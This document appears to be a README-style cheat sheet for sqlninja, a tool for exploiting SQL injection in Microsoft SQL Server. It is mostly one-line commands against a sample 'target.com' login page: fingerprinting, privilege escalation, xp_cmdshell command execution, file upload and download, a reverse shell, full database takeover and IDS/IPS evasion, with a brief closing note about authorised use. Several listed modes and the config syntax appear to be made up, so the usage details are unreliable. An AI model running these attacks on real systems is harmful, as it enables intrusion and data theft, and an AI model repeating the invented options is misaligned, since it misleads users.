# SQLNinja - Microsoft SQL Server Injection Tool

Specialized tool for exploiting SQL injection vulnerabilities in Microsoft SQL Server environments.

## Installation

```bash
# Ubuntu/Debian
apt install sqlninja

# From source  
git clone https://github.com/xxgrunge/sqlninja.git
cd sqlninja
```

## Configuration

```bash
# Create configuration file
cp sqlninja.conf.example sqlninja.conf

# Edit configuration
vim sqlninja.conf
```

### Basic Configuration Options

```bash
# Target configuration
httprequest = POST /vulnerable/login.asp HTTP/1.1\r\nHost: target.com\r\nContent-Length: __LENGTH__\r\n\r\nuser=admin&pass=test__SQL__

# Injection point
blindsqli = 1

# Database server details  
host = target.com
port = 1433
```

## Attack Modes

### Fingerprinting
```bash
# Test injection point
sqlninja -m test -f sqlninja.conf

# Fingerprint database version
sqlninja -m fingerprint -f sqlninja.conf
```

### Privilege Escalation
```bash
# Test current user privileges
sqlninja -m bruteforce -f sqlninja.conf

# Escalate privileges
sqlninja -m escalation -f sqlninja.conf
```

### Command Execution
```bash
# Enable xp_cmdshell
sqlninja -m cmdexec -f sqlninja.conf

# Execute system commands
sqlninja -m shell -f sqlninja.conf
```

### File Operations
```bash
# Upload files to target
sqlninja -m upload -f sqlninja.conf

# Download files from target
sqlninja -m download -f sqlninja.conf
```

## Advanced Features

### Reverse Shell
```bash
# Create reverse shell connection
sqlninja -m revshell -f sqlninja.conf
```

### Database Takeover
```bash
# Complete database compromise
sqlninja -m takeover -f sqlninja.conf
```

### Evasion Techniques
```bash
# IDS/IPS evasion
sqlninja -m evasion -f sqlninja.conf

# Custom encoding methods
sqlninja -m encoding -f sqlninja.conf
```

## Microsoft SQL Server Specific

### System Functions
- xp_cmdshell exploitation
- sp_OACreate COM object abuse
- Bulk insert operations
- Linked server attacks

### Registry Manipulation
- Registry key enumeration
- Registry value modification
- Service configuration changes

### Network Discovery
- Internal network scanning
- Port enumeration through SQL
- Service identification

## Integration

Works well with:
- Metasploit framework
- Empire PowerShell framework
- Custom exploitation scripts
- Post-exploitation frameworks

Only target systems you own or have explicit written permission to test.
